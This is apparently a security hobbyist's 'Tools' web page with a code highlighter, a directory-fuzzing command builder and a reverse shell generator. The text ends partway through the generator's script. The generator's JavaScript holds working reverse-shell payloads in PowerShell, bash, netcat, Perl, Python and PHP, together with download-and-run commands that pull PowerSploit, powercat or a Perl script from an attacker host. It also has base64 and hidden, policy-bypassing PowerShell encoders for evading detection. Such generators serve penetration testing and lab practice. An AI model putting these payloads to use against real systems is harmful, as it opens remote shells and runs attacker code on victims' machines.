---
title: "Tools"
layout: "post"
---

## Syntax Highlighting

<link rel="stylesheet" href="/assets/highlight/styles/monokai-sublime.css">
<script src="/assets/highlight/highlight.pack.js"></script>
<script>
    var g_style_url = "/assets/highlight/styles/";

    hljs.initHighlightingOnLoad(); // Initialize highlight.js 
  
    function autoApplyLanguageStyle() {

        lg_saved = sessionStorage.getItem("language"); // Get the current language from the local session

        if (lg_saved != null) { 
            for (i=0; i < document.getElementById("select_language").length; i++) {
                if (document.getElementById("select_language")[i].value == lg_saved) {
                    document.getElementById("select_language")[i].selected = "true"; // Auto-select the value in the dropdown list 
                    break;
                }
            }
        }

        st_saved = sessionStorage.getItem("style"); // Get the current style from the local session

        if (st_saved != null) {
            for (i=0; i < document.getElementById("select_style").length; i++) {
                if (document.getElementById("select_style")[i].value == st_saved) {
                    document.getElementById("select_style")[i].selected = "true"; // Auto-select the value in the dropdown list 
                    break;
                }
            }
        }
    }

    function escapeHtml(unsafe) {

        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");

    }

    function updateStyle() {

        st = document.getElementById("select_style").value; // Get the select style 

        var links = document.getElementsByTagName("link");

        for (var i = links.length; i >= 0; i--) {

            if (links[i] && links[i].getAttribute("href") != null) {

                if (links[i].getAttribute("href").indexOf(g_style_url) != -1) {

                    var old_style_url = links[i].getAttribute("href")
                    var new_style_url = g_style_url + st + ".css"

                    if (old_style_url != new_style_url) {

                        var newlink = document.createElement("link");
                        newlink.setAttribute("rel", "stylesheet");
                        newlink.setAttribute("type", "text/css");
                        newlink.setAttribute("href", new_style_url);
                        links[i].parentNode.replaceChild(newlink, links[i])

                        sessionStorage.setItem("style", st); // Store selected style in the local session 
                    }
                }
            }
        }
    }
  
    function updateCode() {

        c = document.getElementById("textarea_src_code").value; // Get the source code to highlight
        lg = document.getElementById("select_language").value; // Get the selected language

        cr = document.getElementById("code_result"); // Get the preview element 
        cr.className = ""; // Remove any class that was previously added to this element 
        cr.classList.add("hljs"); // Add the default 'hljs" class to the element 
        cr.classList.add(lg); // Add the class corresponding to the selected language 

        sessionStorage.setItem("language", lg); // Store the selected language in the local session
                    
        document.getElementById("code_result").innerHTML = escapeHtml(c); // Copy the source code to the preview element 
        hljs.highlightBlock(document.getElementById("code_result")); // Syntax highlighting (highlight.js) 

    }

    function updateStyleAndCode() {
        updateStyle();
        updateCode();
    }
</script>

<div>
    <div name="code">
        <textarea id ="textarea_src_code" rows="8" spellcheck="false" style="width:100%" onchange="updateCode()">print("Hello World!")</textarea>
    </div>
    <div name="options" style="width:100%;display:flex">
        <div style="margin: 0 10px 0 0">
        <label for="select_language">Language:</label>
        <select id="select_language" onchange="updateCode()">
            <option value="1c">1C</option>
            <option value="abnf">ABNF</option>
            <option value="accesslog">Access logs</option>
            <option value="ada">Ada</option>
            <option value="arm">ARM assembler</option>
            <option value="avrasm">AVR assembler</option>
            <option value="actionscript">ActionScript</option>
            <option value="apache">Apache</option>
            <option value="applescript">AppleScript</option>
            <option value="arcade">Arcade</option>
            <option value="asciidoc">AsciiDoc</option>
            <option value="aspectj">AspectJ</option>
            <option value="autohotkey">AutoHotkey</option>
            <option value="autoit">AutoIt</option>
            <option value="awk">Awk</option>
            <option value="axapta">Axapta</option>
            <option value="bash">Bash</option>
            <option value="basic">Basic</option>
            <option value="bnf">BNF</option>
            <option value="brainfuck">Brainfuck</option>
            <option value="csharp">C#</option>
            <option value="cpp">C++</option>
            <option value="cal">C/AL</option>
            <option value="cos">Cache Object Script</option>
            <option value="cmake">CMake</option>
            <option value="coq">Coq</option>
            <option value="csp">CSP</option>
            <option value="css">CSS</option>
            <option value="capnproto">Cap???n Proto</option>
            <option value="clojure">Clojure</option>
            <option value="coffeescript">CoffeeScript</option>
            <option value="crmsh">Crmsh</option>
            <option value="crystal">Crystal</option>
            <option value="dns">DNS Zone file</option>
            <option value="dos">DOS</option>
            <option value="dart">Dart</option>
            <option value="delphi">Delphi</option>
            <option value="diff">Diff</option>
            <option value="django">Django</option>
            <option value="dockerfile">Dockerfile</option>
            <option value="dsconfig">dsconfig</option>
            <option value="dts">DTS (Device Tree)</option>
            <option value="dust">Dust</option>
            <option value="elixir">Elixir</option>
            <option value="elm">Elm</option>
            <option value="erlang">Erlang</option>
            <option value="excel">Excel</option>
            <option value="fix">FIX</option>
            <option value="fortran">Fortran</option>
            <option value="gcode">G-Code</option>
            <option value="gams">Gams</option>
            <option value="gauss">GAUSS</option>
            <option value="gherkin">Gherkin</option>
            <option value="go">Go</option>
            <option value="golo">Golo</option>
            <option value="gradle">Gradle</option>
            <option value="groovy">Groovy</option>
            <option value=" XML">HTML</option>
            <option value="http">HTTP</option>
            <option value="haml">Haml</option>
            <option value="handlebars">Handlebars</option>
            <option value="haskell">Haskell</option>
            <option value="haxe">Haxe</option>
            <option value="hy">Hy</option>
            <option value=" TOML">Ini</option>
            <option value="inform7">Inform7</option>
            <option value="irpf90">IRPF90</option>
            <option value="json">JSON</option>
            <option value="java">Java</option>
            <option value="javascript">JavaScript</option>
            <option value="kotlin">Kotlin</option>
            <option value="leaf">Leaf</option>
            <option value="lasso">Lasso</option>
            <option value="less">Less</option>
            <option value="ldif">LDIF</option>
            <option value="lisp">Lisp</option>
            <option value="livecodeserver">LiveCode Server</option>
            <option value="livescript">LiveScript</option>
            <option value="lua">Lua</option>
            <option value="makefile">Makefile</option>
            <option value="markdown">Markdown</option>
            <option value="mathematica">Mathematica</option>
            <option value="matlab">Matlab</option>
            <option value="maxima">Maxima</option>
            <option value="mel">Maya Embedded Language</option>
            <option value="mercury">Mercury</option>
            <option value="mizar">Mizar</option>
            <option value="mojolicious">Mojolicious</option>
            <option value="monkey">Monkey</option>
            <option value="moonscript">Moonscript</option>
            <option value="n1ql">N1QL</option>
            <option value="nsis">NSIS</option>
            <option value="nginx">Nginx</option>
            <option value="nimrod">Nimrod</option>
            <option value="nix">Nix</option>
            <option value="ocaml">OCaml</option>
            <option value="objectivec">Objective C</option>
            <option value="glsl">OpenGL Shading Language</option>
            <option value="openscad">OpenSCAD</option>
            <option value="ruleslanguage">Oracle Rules Language</option>
            <option value="oxygene">Oxygene</option>
            <option value="pf">PF</option>
            <option value="php">PHP</option>
            <option value="parser3">Parser3</option>
            <option value="perl">Perl</option>
            <option value="plaintext">Plaintext</option>
            <option value="pony">Pony</option>
            <option value="pgsql">PostgreSQL & PL/pgSQL</option>
            <option value="powershell">PowerShell</option>
            <option value="processing">Processing</option>
            <option value="prolog">Prolog</option>
            <option value="properties">Properties</option>
            <option value="protobuf">Protocol Buffers</option>
            <option value="puppet">Puppet</option>
            <option value="python" selected>Python</option>
            <option value="profile">Python profiler results</option>
            <option value="k">Q</option>
            <option value="qml">QML</option>
            <option value="r">R</option>
            <option value="reasonml">ReasonML</option>
            <option value="rib">RenderMan RIB</option>
            <option value="rsl">RenderMan RSL</option>
            <option value="graph">Roboconf</option>
            <option value="ruby">Ruby</option>
            <option value="rust">Rust</option>
            <option value="sas">SAS</option>
            <option value="scss">SCSS</option>
            <option value="sql">SQL</option>
            <option value="p21">STEP Part 21</option>
            <option value="scala">Scala</option>
            <option value="scheme">Scheme</option>
            <option value="scilab">Scilab</option>
            <option value="shell">Shell</option>
            <option value="smali">Smali</option>
            <option value="smalltalk">Smalltalk</option>
            <option value="stan">Stan</option>
            <option value="stata">Stata</option>
            <option value="stylus">Stylus</option>
            <option value="subunit">SubUnit</option>
            <option value="swift">Swift</option>
            <option value="tcl">Tcl</option>
            <option value="tap">Test Anything Protocol</option>
            <option value="tex">TeX</option>
            <option value="thrift">Thrift</option>
            <option value="tp">TP</option>
            <option value="twig">Twig</option>
            <option value="typescript">TypeScript</option>
            <option value="vbnet">VB.Net</option>
            <option value="vbscript">VBScript</option>
            <option value="vhdl">VHDL</option>
            <option value="vala">Vala</option>
            <option value="verilog">Verilog</option>
            <option value="vim">Vim Script</option>
            <option value="x86asm">x86 Assembly</option>
            <option value="xl">XL</option>
            <option value="xquery">XQuery</option>
            <option value="yml">YAML</option>
            <option value="zephir">Zephir</option>
        </select>
        </div>
        <div style="margin: 0 10px 0 0">
        <label for="select_style">Style:</label>
        <select id="select_style" onchange="updateStyle()">
            <option value="a11y-dark">A11y Dark</option>
            <option value="a11y-light">A11y Light</option>
            <option value="agate">Agate</option>
            <option value="androidstudio">Androidstudio</option>
            <option value="an-old-hope">An Old Hope</option>
            <option value="arduino-light">Arduino Light</option>
            <option value="arta">Arta</option>
            <option value="ascetic">Ascetic</option>
            <option value="atelier-cave-dark">Atelier Cave Dark</option>
            <option value="atelier-cave-light">Atelier Cave Light</option>
            <option value="atelier-dune-dark">Atelier Dune Dark</option>
            <option value="atelier-dune-light">Atelier Dune Light</option>
            <option value="atelier-estuary-dark">Atelier Estuary Dark</option>
            <option value="atelier-estuary-light">Atelier Estuary Light</option>
            <option value="atelier-forest-dark">Atelier Forest Dark</option>
            <option value="atelier-forest-light">Atelier Forest Light</option>
            <option value="atelier-heath-dark">Atelier Heath Dark</option>
            <option value="atelier-heath-light">Atelier Heath Light</option>
            <option value="atelier-lakeside-dark">Atelier Lakeside Dark</option>
            <option value="atelier-lakeside-light">Atelier Lakeside Light</option>
            <option value="atelier-plateau-dark">Atelier Plateau Dark</option>
            <option value="atelier-plateau-light">Atelier Plateau Light</option>
            <option value="atelier-savanna-dark">Atelier Savanna Dark</option>
            <option value="atelier-savanna-light">Atelier Savanna Light</option>
            <option value="atelier-seaside-dark">Atelier Seaside Dark</option>
            <option value="atelier-seaside-light">Atelier Seaside Light</option>
            <option value="atelier-sulphurpool-dark">Atelier Sulphurpool Dark</option>
            <option value="atelier-sulphurpool-light">Atelier Sulphurpool Light</option>
            <option value="atom-one-dark">Atom One Dark</option>
            <option value="atom-one-dark-reasonable">Atom One Dark Reasonable</option>
            <option value="atom-one-light">Atom One Light</option>
            <option value="brown-paper">Brown Paper</option>
            <option value="codepen-embed">Codepen Embed</option>
            <option value="color-brewer">Color Brewer</option>
            <option value="darcula">Darcula</option>
            <option value="dark">Dark</option>
            <option value="darkula">Darkula</option>
            <option value="default">Default</option>
            <option value="docco">Docco</option>
            <option value="dracula">Dracula</option>
            <option value="far">Far</option>
            <option value="foundation">Foundation</option>
            <option value="github">Github</option>
            <option value="github-gist">Github Gist</option>
            <option value="gml">Gml</option>
            <option value="googlecode">Googlecode</option>
            <option value="gradient-dark">Gradient Dark</option>
            <option value="grayscale">Grayscale</option>
            <option value="gruvbox-dark">Gruvbox Dark</option>
            <option value="gruvbox-light">Gruvbox Light</option>
            <option value="hopscotch">Hopscotch</option>
            <option value="hybrid">Hybrid</option>
            <option value="idea">Idea</option>
            <option value="ir-black">Ir Black</option>
            <option value="isbl-editor-dark">Isbl Editor Dark</option>
            <option value="isbl-editor-light">Isbl Editor Light</option>
            <option value="kimbie.light">Kimbie Light</option>
            <option value="kimbie.dark">Kimbie Dark</option>
            <option value="lightfair">Lightfair</option>
            <option value="magula">Magula</option>
            <option value="mono-blue">Mono Blue</option>
            <option value="monokai">Monokai</option>
            <option value="monokai-sublime" selected>Monokai Sublime</option>
            <option value="night-owl">Night Owl</option>
            <option value="nord">Nord</option>
            <option value="obsidian">Obsidian</option>
            <option value="ocean">Ocean</option>
            <option value="paraiso-dark">Paraiso Dark</option>
            <option value="paraiso-light">Paraiso Light</option>
            <option value="pojoaque">Pojoaque</option>
            <option value="purebasic">Purebasic</option>
            <option value="qtcreator_dark">Qtcreator Dark</option>
            <option value="qtcreator_light">Qtcreator Light</option>
            <option value="railscasts">Railscasts</option>
            <option value="rainbow">Rainbow</option>
            <option value="routeros">Routeros</option>
            <option value="school-book">School Book</option>
            <option value="shades-of-purple">Shades Of Purple</option>
            <option value="solarized-dark">Solarized Dark</option>
            <option value="solarized-light">Solarized Light</option>
            <option value="sunburst">Sunburst</option>
            <option value="tomorrow">Tomorrow</option>
            <option value="tomorrow-night-blue">Tomorrow Night Blue</option>
            <option value="tomorrow-night-bright">Tomorrow Night Bright</option>
            <option value="tomorrow-night">Tomorrow Night</option>
            <option value="tomorrow-night-eighties">Tomorrow Night Eighties</option>
            <option value="vs2015">Vs2015</option>
            <option value="vs">Vs</option>
            <option value="xcode">Xcode</option>
            <option value="xt256">Xt256</option>
            <option value="zenburn">Zenburn</option>
        </select>
        </div>
    </div>
    <div style="overflow:auto">
        <pre id="code_result"></pre>
    </div>
</div>
<script>
    autoApplyLanguageStyle();
    updateStyleAndCode();
</script>

---

## Web Fuzzing

<div>
    <label for="wf_url">URL</label>
    <input name="wf_url" id="wf_url" value="http://127.0.0.1/foo123/" style="width:100%" onchange="wfUpdateView()" />
    <label for="wf_folder">Log folder</label>
    <input name="wf_folder" id="wf_folder" style="width:100%" onchange="wfUpdateView()" value="./recon/" />
    <label for="wf_wordlist">Wordlist</label>
    <select id="wf_wordlist" style="width:100%" onchange="wfUpdateView()">
    </select>
    Options
    <div>
        <form id="wf_opt_checkboxes">
            <input type="checkbox" value="" id="wf_opt_log_results" checked onchange="wfUpdateView()">
            <label for="wf_opt_log_results" data-toggle="tooltip" title="">Log results to a file</label>
            <input type="checkbox" value="" id="wf_opt_runasroot" onchange="wfUpdateView()">
            <label for="wf_opt_runasroot" data-toggle="tooltip" title="">Run as root</label>
            <input type="checkbox" value="" id="wf_opt_proxy" onchange="wfUpdateView()">
            <label for="wf_opt_proxy" data-toggle="tooltip" title="">Proxy tool</label>
            <input type="hidden" id="wf_opt_proxy_tool" value="proxychains" onchange="wfUpdateView()">
        </form>
    </div>
    Extensions
    <div>
        <form id="wf_ext_checkboxes">
        </form>
    </div>
    <div style="overflow:auto">
        <pre id="wf_code_result"></pre>
    </div>
</div>

<script>

    const global_wordlists = {
        "wf_wordlist_empty": "",
        "wf_wordlist_dirb-common": "/usr/share/dirb/wordlists/common.txt",
        "wf_wordlist_dirbuster-medium": "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
    };

    const global_extensions = {
        "wf_ext_slash": "/",
        "wf_ext_static": "html,js",
        "wf_ext_php": "php,php~",
        "wf_ext_iis": "asp,aspx,aspx~",
        "wf_ext_java": "jar,jsp,jsp~,do,properties",
        "wf_ext_python": "py,py~,pyc",
        "wf_ext_ruby": "rb,rb~",
        "wf_ext_system": "bak,bkp,backup,old,tar,tar.bz2,tar.gz,rar,conf,config,swp,swp~,cache",
        "wf_ext_db": "db,sql,sql~,sql.gz,sql.tar.gz",
        "wf_ext_misc": "txt,xml,cgi,csv,json,log,wadl"
    };

    const global_tools = [ "dirb", "dirsearch", "wfuzz", "gobuster", "nikto" ];

    class WebFuzzingParams {

        constructor(url) {
            this.url = url;
            this.validUrl = this.isValidUrl();
            this.logFolder = "";
            this.wordlistId = "";
            this.extensions = [];
            this.logResults = true;
            this.runAsRoot = false;
            this.useSocksTool = false;
            this.socksTool = "";
        }

        isValidUrl() {
            try {
                var tmpUrl = new URL(this.url);
                return true;
            } catch {
                return false;
            }
        }

        extensionsToString(prefix, seperator) {
            var result = "";
            for (var i=0; i<this.extensions.length; i++) {
                ext = extensions[i];
                result += ext == '/' ? '/' : prefix + ext;
                if (i < extensions.length - 1) {
                    result += seperator;
                }
            }
            return result;
        }

        generateLogPath(tool) {
            var result = "";
            
            if (this.logFolder != "") {
                result += this.logFolder;
                if (this.logFolder[this.logFolder.length - 1] != '/') {
                    result += "/";
                }
            }
            
            result += wfHelperUrlToFileName(this.url);
            result += tool == "" ? "_unknown" : "_" + tool;
            result += this.wordlistId == "wf_wordlist_empty" ? "_wl-default" : "_wl-" + this.wordlistId.split('_')[this.wordlistId.split('_').length - 1];
            result += ".log"
            
            return result;
        }

        generateCommands() {
            var result = "";

            if (this.validUrl === false) {
                return result;
            }

            var wordlistPath = global_wordlists[this.wordlistId];

            for (var i=0; i<global_tools.length; i++) {
                var tool = global_tools[i];

                var logpath = "";
                if (this.logResults == true) {
                    logpath = this.generateLogPath(tool);
                }

                var proxyTool = "";
                if (this.useSocksTool) {
                    proxyTool = this.socksTool;
                }
                
                var command = wfHelperFormatCommand(tool, this.url, logpath, wordlistPath, this.extensions, proxyTool, this.runAsRoot);
                if (command != "") {
                    result += command + "\n";
                }
            }
            return result;
        }
    }

    function wfHelperUrlToFileName(url) {
        var result = "";
        try {
            urlObj = new URL(url);
            result += urlObj.hostname;
            if (urlObj.port == "") {
                if (urlObj.protocol == "http:") {
                    result += "-80"; 
                } else if (urlObj.protocol == "https:") {
                    result += "-443";
                }
            } else {
                result += "-" + urlObj.port;
            }

            var path = urlObj.pathname;
            if (path.length > 1) {
                if (path[path.length - 1] == '/') {
                    path = path.slice(0, path.length - 1);
                }
                result += path.split('/').join('-');
            }

            return result;
        } catch {
            console.log("Invalid URL: " + url);
        }
    }

    function wfHelperPrepareExtensionList(extensions, prefix, seperator) {
        var result = "";
        for (var i=0; i<extensions.length; i++) {
            ext = extensions[i];
            result += ext == '/' ? '/' : prefix + ext;
            if (i < extensions.length - 1) {
                result += seperator;
            }
        }
        return result;
    }

    function wfHelperGetExtensionList() {
        var result = [];
        var ids = Object.keys(global_extensions);
        for (var i=0; i<ids.length; i++) {
            var checkbox = document.getElementById(ids[i]);
            if (checkbox.checked) {
                result = result.concat(global_extensions[ids[i]].split(','));
            }
        }
        return result;
    }

    function wfHelperFormatCommand(tool, url, logpath, wordlist, extensions, proxy, asroot) {

        var result = "";
        var toReturn = false;

        if (asroot) {
            result += "sudo ";
        }

        if (proxy != "") {
            result += proxy + " ";
        }

        if (tool == "dirb") {

            // dirb has no particular requirements
            // result += "# https://gitlab.com/kalilinux/packages/dirb\n";
            result += "dirb";
            result += " '" + url + "'";
            result += extensions.length == 0 ? "" : " -X '" + wfHelperPrepareExtensionList(extensions, '.', ',') + ",,'";
            result += logpath.length == 0 ? "" : " -o '" + logpath + "'";
            result += wordlist.length == 0 ? "" : " '" + wordlist + "'";
            toReturn = true;

        } else if (tool == "dirsearch") {

            // dirsearch requires an extension list
            // if (extensions.length != 0) {
            //     // result = "# https://github.com/maurosoria/dirsearch\n";
            //     result += "dirsearch.py -e";
            //     result += " '" + extensions.join(',') + "' -f";
            //     result += wordlist.length == 0 ? "" : " -w '" + wordlist + "'";
            //     result += logpath == "" ? "" : " --plain-text-report '" + logpath + "'";
            //     result += " -u '" + url + "'";
            //     toReturn = true;
            // }

            result += "dirsearch.py";
            result += extensions.length == 0 ? "" : " -e '" + extensions.join(',') + "'";
            result += wordlist.length == 0 ? "" : " -w '" + wordlist + "'";
            result += logpath == "" ? "" : " -o '" + logpath + "' --format plain";
            result += " -u '" + url + "'";
            toReturn = true;

        } else if (tool == "wfuzz") {

            // wfuzz requires a wordlist
            if (wordlist != "") {
                // result = "# https://github.com/xmendez/wfuzz/\n";
                result += "wfuzz -c";
                result += " -z 'file," + wordlist + "'";
                result += extensions.length == 0 ? "" : " -z 'list," + wfHelperPrepareExtensionList(extensions, '.', '-') + "-'";
                result += logpath == "" ? "" : " -f '" + logpath + "'";
                result += " --hc 404";
                result += " '" + url;
                result += url[url.length - 1] == '/' ? "" : "/";
                result += "FUZZ";
                result += extensions.length == 0 ? "" : "FUZ2Z";
                result += "'";
                toReturn = true;
            }

        } else if (tool == "gobuster") {

            // gobuster requires a wordlist
            if (wordlist != "") {
                // result = "# https://github.com/OJ/gobuster\n";
                result += "gobuster dir -e";
                result += "  -w '" + wordlist + "'";
                result += extensions.length == 0 ? "" : " -x '" + wfHelperPrepareExtensionList(extensions, '.', ',') + ",,'";
                result += logpath.length == 0 ? "" : " -o '" + logpath + "'";
                result += " -u '" + url + "'";
                toReturn = true;
            }

        } else if (tool == "nikto") {

            // result = "# https://www.cirt.net/Nikto2\n";
            result += "nikto -C all";
            result += logpath.length == 0 ? "" : " -output '" + logpath + "' -Format txt";
            result += " -host '" + url + "'";
            toReturn = true;
        }

        return toReturn ? result : "";
    }

    function wfUpdateView() {

        wfHelperUpdateProxyOption();
        wfHelperUpdateCodeSection();

    }

    function wfHelperUpdateCodeSection() {

        var params = new WebFuzzingParams(document.getElementById("wf_url").value);
        params.logFolder = document.getElementById("wf_folder").value;
        params.wordlistId = document.getElementById("wf_wordlist").value;
        params.extensions = wfHelperGetExtensionList();
        params.logResults = document.getElementById("wf_opt_log_results").checked;
        params.runAsRoot = document.getElementById("wf_opt_runasroot").checked;
        params.useSocksTool = document.getElementById("wf_opt_proxy").checked;
        params.socksTool = document.getElementById("wf_opt_proxy_tool").value;

        commands = params.generateCommands();

        var wf_code = document.getElementById("wf_code_result");
        wf_code.className = "";
        wf_code.classList.add("hljs");
        wf_code.classList.add("bash");
        wf_code.innerHTML = escapeHtml(commands);
        hljs.highlightBlock(wf_code);
    }

    function wfHelperUpdateProxyOption() {

        if (document.getElementById("wf_opt_proxy").checked) {
            document.getElementById("wf_opt_proxy_tool").type = "text";
        } else {
            document.getElementById("wf_opt_proxy_tool").type = "hidden";
        }
    }

    function wfHelperCreateWordlistDropdown() {

        var wf_wordlist_select = document.getElementById("wf_wordlist");

        for (const key of Object.keys(global_wordlists)) {
            var option = document.createElement("option");
            option.value = key;
            option.text = global_wordlists[key];
            wf_wordlist_select.appendChild(option);
        }
    }

    function wfHelperCreateExtensionCheckboxes() {
        
        var wf_checkbox_form = document.getElementById("wf_ext_checkboxes");

        for (const key of Object.keys(global_extensions)) {

            var checkbox = document.createElement("input");
            checkbox.type = "checkbox";
            checkbox.id = key;
            checkbox.value = "";
            checkbox.onchange = wfUpdateView;
            wf_checkbox_form.appendChild(checkbox);

            var label = document.createElement("label");
            label.htmlFor = key;
            label.title = global_extensions[key];
            label.innerHTML = key.split('_')[key.split('_').length - 1];
            wf_checkbox_form.appendChild(label);
        }
    }

    wfHelperCreateWordlistDropdown();
    wfHelperCreateExtensionCheckboxes();
    wfUpdateView();

</script>

---

## Reverse Shell Generator

<script>

    function encodeBash(payload) {
        return "bash -c \"{echo," + btoa(payload) + "}|{base64,-d}|{bash,-i}\"";
    }

    function encodePowerShell(payload) {

        // Convert payload string to byte array
        var array = new Uint8Array(payload.length*2);
        for (var i=0; i<array.length; i++) {
            if (i % 2 == 0) {
                array[i] = payload[i/2].charCodeAt(0);
            } else {
                array[i] = 0;
            }
        }

        // Convert byte array to binary string
        var bstr = "";
        for (var i=0; i<array.length; i++) {
            bstr += String.fromCharCode(array[i]);
        }

        // Convert binary string to base64 and create command line
        var result = "powershell -nop -noni -w Hidden -ep Bypass -e " + btoa(bstr);

        return result;
    }

    function updateOutput(eltName, eltValue, eltClass) {

        elt = document.getElementById(eltName);
        elt.className = "";
        elt.classList.add("hljs");
        elt.classList.add(eltClass);
        elt.innerHTML = escapeHtml(eltValue);
        hljs.highlightBlock(elt);

    }

    function updateCommandOutput() {

        var sl = document.getElementById("rs_select_language").value;
        var lhost = document.getElementById("rs_lhost").value;
        var lport = document.getElementById("rs_lport").value;

        if (sl != "" && sessionStorage.getItem("rs_select_language") != sl) {
            sessionStorage.setItem("rs_select_language", sl);
        }

        if (lhost != "" && sessionStorage.getItem("rs_lhost") != lhost) {
            sessionStorage.setItem("rs_lhost", lhost);
        }
        
        if (lport != "" && sessionStorage.getItem("rs_lport") != lport) {
            sessionStorage.setItem("rs_lport", lport);
        }

        var res_raw = "";
        var res_oneliner = "";
        var res_encoded = "";
        var res_raw_hljs = "";
        var res_oneliner_hljs = "";
        var res_encoded_hljs = "";

        if (sl == "psh") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "$c=New-Object Net.Sockets.TcpClient(\"" + lhost + "\"," + lport + ")\n$s=$c.GetStream()\n$sb=([Text.Encoding]::UTF8).GetBytes(\"PS \"+(pwd).Path+\"> \")\n$s.Write($sb,0,$sb.Length)\n[byte[]]$b=0..65535|%{0}\nwhile(($i=$s.Read($b,0,$b.Length)) -ne 0){\n    $d=(New-Object -t Text.UTF8Encoding).GetString($b,0,$i)\n    $sb=(iex $d | Out-String) 2>&1\n    $sb2=$sb+\"PS \"+(pwd).Path+\"> \"\n    $sb=([Text.Encoding]::UTF8).GetBytes($sb2)\n    $s.Write($sb,0,$sb.Length)\n    $s.Flush()\n}\n$c.Close()";
            res_oneliner = "# No one-liner for this payload";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_ssl") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "$c=New-Object Net.Sockets.TcpClient(\"" + lhost + "\"," + lport + ")\n$s=$c.GetStream()\n$ss=New-Object Net.Security.SslStream($s,$False,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$ss.AuthenticateAsClient(\"foo.tld\",$Null,\"Tls12\",$False)\n$w=New-Object IO.StreamWriter($ss)\n$w.Write(\"PS \"+(pwd).Path+\"> \")\n$w.Flush()\n[byte[]]$b=0..65535|%{0}\nwhile(($i=$ss.Read($b,0,$b.Length)) -ne 0){\n    $d=(New-Object -TypeName Text.UTF8Encoding).GetString($b,0,$i)\n    $sb=(iex $d | Out-String) 2>&1\n    $sb2=$sb+\"PS \"+(pwd).Path+\"> \"\n    $sb=([Text.Encoding]::UTF8).GetBytes($sb2)\n    $ss.Write($sb,0,$sb.Length)\n    $ss.Flush()\n}\n$c.Close()";
            res_oneliner = "# No one-liner for this payload";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_powersploit") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "IEX (New-Object System.Net.WebClient).DownloadString('http://" + lhost + "/tools/Invoke-PowerShellTcp.ps1');\nInvoke-powershellTcp -Reverse -IPAddress " + lhost + " -Port " + lport;
            res_oneliner = "powershell -nop -noni -w Hidden -ep Bypass -c \"" + res_raw.replace(/\n/g, "") + "\"";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_powercat") { 
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "bash";
            res_raw = "IEX (New-Object System.Net.WebClient).DownloadString('http://" + lhost + "/tools/powercat.ps1');\npowercat -c " + lhost + " -p " + lport + " -e cmd";
            res_oneliner = "powershell -nop -noni -w Hidden -ep Bypass -c \"" + res_raw.replace(/\n/g, "") + "\"";;
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "bash") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1";
            res_oneliner = "bash -c \"" + res_raw + "\"";
            res_encoded = encodeBash(res_raw);
        } else if (sl == "bash_mkfifo") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "rm /tmp/f;\nmkfifo /tmp/f;\ncat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f";
            res_oneliner = res_raw.replace(/\n/g, "");
            res_encoded = encodeBash(res_raw);
        } else if (sl == "perl") { 
            res_raw_hljs = "perl";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "use Socket;\n$i=\"" + lhost + "\";\n$p=" + lport + ";\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\n\topen(STDIN,\">&S\");\n\topen(STDOUT,\">&S\");\n\topen(STDERR,\">&S\");\n\texec(\"/bin/sh -i\");\n};";
            res_oneliner = "perl -e '" + res_raw.replace(/\t/g, "").replace(/\n/g, "") + "'";
            res_encoded = "perl -MMIME::Base64 -e \"eval(decode_base64('" + btoa(res_raw) + "'))\"";
        } else if (sl == "perl_web") { 
            res_raw_hljs = "perl";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "curl http://" + lhost + "/rev.pl -o /tmp/rev.pl ; perl /tmp/rev.pl";
            res_oneliner = res_raw;
            res_encoded = encodeBash(res_raw);
        } else if (sl == "python") { 
            res_raw_hljs = "python";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"" + lhost + "\"," + lport + "));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call([\"/bin/sh\",\"-i\"]);";
            res_oneliner = "python -c '" + res_raw.replace(/\n/g, "") + "'";
            res_encoded = "python -c \"exec('" + btoa(res_raw) + "'.decode('base64'))\"";
        } else if (sl == "netcat") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "nc -e /bin/sh " + lhost + " " + lport;
            res_oneliner = res_raw;
            res_encoded = encodeBash(res_raw);
        } else if (sl == "php") { 
            res_raw_hljs = "php";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "$sock=fsockopen(\"" + lhost + "\"," + lport + ");\nexec(\"/bin/sh -i <&3 >&3 2>&3\");";
            res_oneliner = "php -r '" + res_raw.replace(/\n/g, "") + "'";
            res_encoded = encodeBash(res_oneliner);
        } else if (sl == "groovy") { 
            res_raw_hljs = "groovy";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
